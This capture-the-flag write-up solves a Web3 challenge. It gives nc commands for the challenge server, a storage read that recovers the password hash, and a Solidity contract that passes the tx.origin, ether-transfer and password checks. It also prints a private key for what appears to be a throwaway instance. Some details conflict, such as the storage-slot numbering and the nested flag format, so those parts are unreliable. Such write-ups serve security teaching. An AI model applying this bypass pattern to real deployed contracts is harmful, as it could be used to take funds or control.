# Gateway - Web3 (199 points)

**Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`
**Attached file:** `Gate.sol`, `Setup.sol`

## Problem Description

The Gateway system establishes a three-layer protection system inside the UPDC smart contract, operating on the Quantum Nexus Network infrastructure. The requirements to complete the challenge include three conditions: (1) Execute a call originating from another smart contract (`tx.origin != msg.sender`), (2) transfer assets (ether) via the default `receive()` function, and (3) submit a correct password value. The interactive Instance is provisioned at the address `nc 34.116.80.78:31337`.

## Initial Analysis

- The `Gate` contract possesses an internal state structure with 4 storage slots, encompassing the state variables: `stepped`, `funded`, and `solved`. The password hash is stored at slot 1.
- The password algorithm is established from the hash expression `keccak256("gateway to the flag")`. This can be verified via the contract state query method `eth_getStorageAt`.
- The server system controlled via the netcat (nc) protocol is configured under an instance factory model similar to the ethernaut standard: each optional action (`1 launch / 2 kill / 3 get flag`) will require opening a distinct TCP connection.
- After the kill and relaunch cycle concludes, the system allocates credential data including: uuid identifier, RPC network endpoint, private key, and the Setup contract's address.
- The proxy RPC endpoint is synced (forked) directly from the mainnet (with chainId 1, at a block position of approximately 26 million). The participant's account is sponsored with an initial balance of 5000 ETH.

## Exploitation Chain

**Step 1 - Network environment analysis and Credentials retrieval.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# System response: "are you sure you solved it?" -> Confirms the system is in a pristine state, no solution recorded yet.

# Kill the old instance if it exists
echo -e "2\nR3:TURИ" | nc 34.116.80.78 31337
# System response: "Instance killed"

# Launch a new instance to receive credential data
echo -e "1\nR3:TURИ" | nc 34.116.80.78 31337
# Output data:
#   uuid:           47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   rpc endpoint:   http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   private key:    0xd5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206
#   setup contract: 0x1ACF30FAB13942fBf5581E8fbDb72D01e2Ad5D3b
```

**Step 2 - Validate the password hash value from the storage slot.**

```python
>>> from web3 import Web3
>>> Web3.keccak(text='gateway to the flag').hex()
'90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b'
>>> # Calculation: eth_getStorageAt(gate, 1) => 0x90cd83d7...9234d70b === MATCH
```

**Step 3 - Deploy the Breaker contract.**

The Breaker contract is built with the objective of bypassing the basic `tx.origin != msg.sender` censorship system:

```solidity
contract Breaker {
    IGate public gate;
    bytes32 public secret;
    
    constructor(IGate _gate, bytes32 _secret) payable {
        gate = _gate; secret = _secret;
    }
    
    function run() external {
        gate.enter();                                    // Bypass Door 1
        (bool ok, ) = address(gate).call{value: 1 ether}("");  // Bypass Door 2 via transfer
        require(ok, "door2");
        gate.claim(secret);                              // Bypass Door 3 via authentication key transmission
    }
    
    receive() external payable {}
}
```

Execute the Deploy command with a value of 3 ETH, passing the constructor args as `(GATE_ADDR, password_hash)`.

**Step 4 - Activate the run() execution function and proceed to validate data.**

```json
{
  "deploy": "Status 0x1, contract deployed at 0xFc5ac01775cF736D929572EC7478ed6930703506",
  "run": "Status 0x1, gas consumption 0xf362",
  "isSolved": "0x0000000000000000000000000000000000000000000000000000000000000001"
}
```

Checking Gate storage slots 2, 3, and 4, the result indicates `0x010101` (confirming all three logic flags `stepped`, `funded`, and `solved` are set to true).

**Step 5 - Retrieve the flag data.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# System response: CSS{B451C_BL0CKCH41N_5K1LL5}
```

Full flag format: `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`.

## Flag

Result:
```text
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```

## Reproduce

Automated re-establishment process via script:

```bash
export CSS_RPC=http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
export CSS_PK=d5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206

cd %TEMP%\css_gate
python exploit.py files/Gate.sol
# Expected output: ✓ FLAG CHAINED!
```
